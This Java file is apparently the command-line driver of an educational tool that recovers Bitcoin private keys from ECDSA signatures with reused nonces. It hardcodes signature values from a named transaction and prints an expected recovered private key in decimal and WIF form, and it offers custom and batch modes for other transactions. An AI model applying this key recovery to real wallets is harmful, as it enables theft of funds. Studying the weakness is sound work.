import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

/**
 * Main class for the ECDSA Nonce Reuse Vulnerability Detector
 * Provides command-line interface and example usage
 */
public class Main {
    
    public static void main(String[] args) {
        System.out.println("=== ECDSA Nonce Reuse Vulnerability Detector ===");
        System.out.println("Educational tool demonstrating ECDSA nonce reuse attack");
        System.out.println("secp256k1 curve order (n): " + ECDSAAttack.CURVE_ORDER.toString(16));
        System.out.println();
        
        ECDSAAttack attack = new ECDSAAttack();
        Scanner scanner = new Scanner(System.in);
        
        while (true) {
            System.out.println("Select an option:");
            System.out.println("1. Analyze example vulnerable transaction");
            System.out.println("2. Enter custom transaction data");
            System.out.println("3. Batch analysis mode");
            System.out.println("4. Exit");
            System.out.print("Enter choice (1-4): ");
            
            String choice = scanner.nextLine().trim();
            
            switch (choice) {
                case "1":
                    analyzeExampleTransaction(attack);
                    break;
                case "2":
                    analyzeCustomTransaction(attack, scanner);
                    break;
                case "3":
                    batchAnalysisMode(attack, scanner);
                    break;
                case "4":
                    System.out.println("Exiting...");
                    return;
                default:
                    System.out.println("Invalid choice. Please try again.");
            }
            
            System.out.println();
        }
    }
    
    /**
     * Analyzes the example vulnerable transaction from the documentation
     */
    private static void analyzeExampleTransaction(ECDSAAttack attack) {
        System.out.println("--- Analyzing Example Vulnerable Transaction ---");
        
        // Create the example transaction from the documentation
        BitcoinTransaction transaction = createExampleTransaction();
        
        // Perform the attack
        ECDSAAttack.AttackResult result = attack.analyzeTransaction(transaction);
        
        // Display results
        displayAttackResult(result);
        
        if (result.isVulnerable() && !result.getRecoveredKeys().isEmpty()) {
            ECDSAAttack.PrivateKeyRecoveryResult recovery = result.getRecoveredKeys().get(0);
            System.out.println("\n--- Expected vs Actual Results ---");
            System.out.println("Expected private key: 35027840177330064405683178523079910253772859809146826320797401203281604260438");
            System.out.println("Actual private key:   " + recovery.getPrivateKey());
            System.out.println("Expected WIF:         KypFJ5YhPwyDV7SKiQCwmHJkjZdHVz6hmb5UcVn7eaHR5pBByLvx");
            System.out.println("Actual WIF:           " + recovery.getWifCompressed());
            
            boolean matches = recovery.getPrivateKey().toString().equals("35027840177330064405683178523079910253772859809146826320797401203281604260438");
            System.out.println("Results match: " + (matches ? "YES" : "NO"));
        }
    }
    
    /**
     * Creates the example vulnerable transaction from the documentation
     */
    private static BitcoinTransaction createExampleTransaction() {
        String txId = "89380c9fb072cbb5af43428788edfd000f2c9c0e1f8649e436d255270e331b02";
        BitcoinTransaction transaction = new BitcoinTransaction(txId);
        
        // Add the vulnerable signatures from the documentation
        // Convert decimal values to BigInteger directly
        BigInteger r = new BigInteger("6819641642398093696120236467967538361543858578256722584730163952555838220871");
        BigInteger s1 = new BigInteger("5111069398017465712735164463809304352000044522184731945150717785434666956473");
        BigInteger m1 = new BigInteger("4834837306435966184874350434501389872155834069808640791394730023708942795899");
        BigInteger s2 = new BigInteger("31133511789966193434473156682648022965280901634950536313584626906865295404159");
        BigInteger m2 = new BigInteger("108808786585075507407446857551522706228868950080801424952567576192808212665067");
        
        transaction.addSignature(new TransactionSignature(r, s1, m1, 0));
        transaction.addSignature(new TransactionSignature(r, s2, m2, 1));
        
        return transaction;
    }
    
    /**
     * Allows user to enter custom transaction data
     */
    private static void analyzeCustomTransaction(ECDSAAttack attack, Scanner scanner) {
        System.out.println("--- Custom Transaction Analysis ---");
        
        System.out.print("Enter transaction ID (optional): ");
        String txId = scanner.nextLine().trim();
        if (txId.isEmpty()) {
            txId = "custom_transaction";
        }
        
        BitcoinTransaction transaction = new BitcoinTransaction(txId);
        
        System.out.print("Enter number of signatures: ");
        int numSigs;
        try {
            numSigs = Integer.parseInt(scanner.nextLine().trim());
        } catch (NumberFormatException e) {
            System.out.println("Invalid number. Using 2 signatures.");
            numSigs = 2;
        }
        
        for (int i = 0; i < numSigs; i++) {
            System.out.println("\n--- Signature " + (i + 1) + " ---");
            
            System.out.print("R value (hex or decimal): ");
            String rValue = scanner.nextLine().trim();
            
            System.out.print("S value (hex or decimal): ");
            String sValue = scanner.nextLine().trim();
            
            System.out.print("Message hash (hex or decimal): ");
            String messageHash = scanner.nextLine().trim();
            
            try {
                // Parse values (auto-detect hex vs decimal)
                BigInteger r = parseValue(rValue);
                BigInteger s = parseValue(sValue);
                BigInteger m = parseValue(messageHash);
                
                transaction.addSignature(new TransactionSignature(r, s, m, i));
                System.out.println("Signature " + (i + 1) + " added successfully.");
                
            } catch (Exception e) {
                System.out.println("Error parsing signature " + (i + 1) + ": " + e.getMessage());
                i--; // Retry this signature
            }
        }
        
        // Perform the attack
        ECDSAAttack.AttackResult result = attack.analyzeTransaction(transaction);
        displayAttackResult(result);
    }
    
    /**
     * Batch analysis mode for multiple transactions
     */
    private static void batchAnalysisMode(ECDSAAttack attack, Scanner scanner) {
        System.out.println("--- Batch Analysis Mode ---");
        System.out.println("Note: This is a simplified batch mode. In a real implementation,");
        System.out.println("you would read from blockchain files or API.");
        
        List<BitcoinTransaction> transactions = new ArrayList<>();
        
        // Add example transaction
        transactions.add(createExampleTransaction());
        
        // Add a safe transaction for comparison
        BitcoinTransaction safeTransaction = new BitcoinTransaction("safe_transaction_example");
        safeTransaction.addSignature(
            "1111111111111111111111111111111111111111111111111111111111111111",
            "2222222222222222222222222222222222222222222222222222222222222222",
            "3333333333333333333333333333333333333333333333333333333333333333",
            0
        );
        safeTransaction.addSignature(
            "4444444444444444444444444444444444444444444444444444444444444444",
            "5555555555555555555555555555555555555555555555555555555555555555",
            "6666666666666666666666666666666666666666666666666666666666666666",
            1
        );
        transactions.add(safeTransaction);
        
        System.out.println("Analyzing " + transactions.size() + " transactions...");
        
        int vulnerableCount = 0;
        int totalKeysRecovered = 0;
        
        for (int i = 0; i < transactions.size(); i++) {
            BitcoinTransaction tx = transactions.get(i);
            System.out.println("\n--- Transaction " + (i + 1) + ": " + tx.getTransactionId() + " ---");
            
            ECDSAAttack.AttackResult result = attack.analyzeTransaction(tx);
            
            if (result.isVulnerable()) {
                vulnerableCount++;
                totalKeysRecovered += result.getRecoveredKeys().size();
                System.out.println("VULNERABLE - " + result.getRecoveredKeys().size() + " key(s) recovered");
            } else {
                System.out.println("SAFE - No vulnerabilities detected");
            }
        }
        
        System.out.println("\n--- Batch Analysis Summary ---");
        System.out.println("Total transactions analyzed: " + transactions.size());
        System.out.println("Vulnerable transactions: " + vulnerableCount);
        System.out.println("Safe transactions: " + (transactions.size() - vulnerableCount));
        System.out.println("Total private keys recovered: " + totalKeysRecovered);
    }
    
    /**
     * Displays the results of an attack analysis
     */
    private static void displayAttackResult(ECDSAAttack.AttackResult result) {
        System.out.println("\n--- Attack Analysis Results ---");
        System.out.println("Transaction ID: " + result.getTransactionId());
        System.out.println("Total signatures: " + result.getTotalSignatures());
        System.out.println("Vulnerable: " + (result.isVulnerable() ? "YES" : "NO"));
        
        if (result.isVulnerable()) {
            System.out.println("Reused R values: " + result.getReusedRValues().size());
            
            for (BigInteger rValue : result.getReusedRValues()) {
                System.out.println("  R = " + rValue.toString(16));
            }
            
            if (!result.getRecoveredKeys().isEmpty()) {
                System.out.println("\n--- Recovered Private Keys ---");
                
                for (int i = 0; i < result.getRecoveredKeys().size(); i++) {
                    ECDSAAttack.PrivateKeyRecoveryResult recovery = result.getRecoveredKeys().get(i);
                    System.out.println("Key " + (i + 1) + ":");
                    System.out.println("  Private Key (decimal): " + recovery.getPrivateKey());
                    System.out.println("  Private Key (hex): " + recovery.getPrivateKey().toString(16));
                    System.out.println("  Nonce (k): " + recovery.getNonce());
                    System.out.println("  WIF (compressed): " + recovery.getWifCompressed());
                    System.out.println("  WIF (uncompressed): " + recovery.getWifUncompressed());
                }
            }
        } else {
            System.out.println("This transaction does not exhibit the nonce reuse vulnerability.");
        }
    }
    
    /**
     * Parses a value that can be in hex or decimal format
     */
    private static BigInteger parseValue(String value) {
        if (value == null || value.trim().isEmpty()) {
            throw new IllegalArgumentException("Value cannot be null or empty");
        }
        
        String trimmed = value.trim();
        
        // Check if it's hex (starts with 0x or contains letters)
        if (trimmed.toLowerCase().startsWith("0x")) {
            return new BigInteger(trimmed.substring(2), 16);
        } else if (trimmed.matches(".*[a-fA-F].*")) {
            return new BigInteger(trimmed, 16);
        } else {
            return new BigInteger(trimmed, 10);
        }
    }
}
